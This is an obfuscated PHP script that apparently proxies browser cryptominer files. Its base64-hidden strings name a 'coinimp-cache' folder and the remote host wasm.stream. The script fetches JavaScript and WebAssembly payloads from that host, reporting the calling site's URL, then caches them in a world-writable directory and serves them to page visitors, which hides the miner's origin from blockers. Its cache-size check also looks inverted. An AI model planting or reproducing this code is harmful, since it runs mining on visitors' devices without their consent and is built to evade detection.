<?php $e5 = base64_decode('aHR0cDovL3d3dy53YXNtLnN0cmVhbS8=');
$h6 = base64_decode('MSBob3Vy');
$z7 = base64_decode('Y29pbmltcC1jYWNoZQ==');
function r0($v8)
{
    $g9 = false;
    if (function_exists(base64_decode('Y3VybF9leGVj'))) {
        if ($na = curl_init($v8)) {
            curl_setopt($na, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($na, CURLOPT_FRESH_CONNECT, true);
            curl_setopt($na, CURLOPT_RETURNTRANSFER, 1);
            $g9 = (curl_exec($na));
            curl_close($na);
        }
    } elseif (function_exists(base64_decode('ZmlsZV9nZXRfY29udGVudHM='))) {
        $g9 = file_get_contents($v8);
    } elseif (function_exists(base64_decode('Zm9wZW4=')) && function_exists(base64_decode('c3RyZWFtX2dldF9jb250ZW50cw=='))) {
        if ($fb = fopen($v8, base64_decode('cg=='))) {
            $g9 = stream_get_contents($fb);
        }
    }
    if ($g9) return $g9; else die("Cannot download \"$v8\"!");
}

function u1($ic)
{
    global $e5;
    $ic = urlencode($ic);
    $hd = strtok($_SERVER[base64_decode('UkVRVUVTVF9VUkk=')], base64_decode('Pw=='));
    $te = urlencode((isset($_SERVER[base64_decode('SFRUUFM=')]) ? base64_decode('aHR0cHM=') : base64_decode('aHR0cA==')) . base64_decode('Oi8v') . $_SERVER[base64_decode('SFRUUF9IT1NU')] . "$hd");
    return r0("$e5?filename=$ic&host=$te");
}

function j2($ic)
{
    return preg_match(base64_decode('L15cd3s0fVwuanMkLw=='), $ic) || preg_match(base64_decode('L15cd3s2fVwuanMkLw=='), $ic) || preg_match(base64_decode('L15cd3s3fVwubWluXC5qc1wubWVtJC8='), $ic) || preg_match(base64_decode('L15cd3s4fVwud2FzbSQv'), $ic) || preg_match(base64_decode('L15cd3s4fVwucG5nJC8='), $ic);
}

function w3()
{
    $cf = array(base64_decode('Y29pbmltcC1jYWNoZQ=='), base64_decode('dG1wL2NvaW5pbXAtY2FjaGU='), base64_decode('L3RtcC9jb2luaW1wLWNhY2hl'));
    foreach ($cf as $p10) {
        if (!file_exists($p10)) mkdir($p10, 0777, true);
        if (is_writeable($p10)) return $p10;
    }
    die(base64_decode('Q2FjaGUgZGlyZWN0b3J5ICJjb2luaW1wLWNhY2hlIiBpcyBub3Qgd3JpdGVhYmxlIQ=='));
}

function f4($v11)
{
    $j12 = 0;
    $p10 = scandir($v11);
    foreach ($p10 as $u13) {
        if (($u13 !== base64_decode('Lg==')) && ($u13 !== base64_decode('Li4='))) if (is_dir($v11 . base64_decode('Lw==') . $u13)) $j12 += f4($v11 . base64_decode('Lw==') . $u13); else $j12 += filesize($v11 . base64_decode('Lw==') . $u13);
    }
    return $j12;
}

$z7 = w3();
$q14 = isset($_GET[base64_decode('Zg==')]) ? $_GET[base64_decode('Zg==')] : '';
if (!j2($q14)) {
    die(base64_decode('SW52YWxpZCBhcmd1bWVudA=='));
}
$i15 = "$z7/$q14";
if (!file_exists($i15) || (filemtime($i15) < strtotime("-$h6"))) {
    $u16 = u1($q14);
    file_put_contents($i15, $u16);
} elseif (f4($z7) < 7000000) {
    rmdir($z7);
    $u16 = u1($q14);
    file_put_contents($i15, $u16);
} else {
    $u16 = file_get_contents($i15);
}
$b17 = substr($q14, -2) == base64_decode('anM=') ? base64_decode('YXBwbGljYXRpb24vamF2YXNjcmlwdA==') : base64_decode('YXBwbGljYXRpb24vb2N0ZXQtc3RyZWFt');
header(base64_decode('Q29udGVudC1UeXBlOiA=') . $b17 . base64_decode('OyBjaGFyc2V0PXV0Zi04'));
die($u16); ?>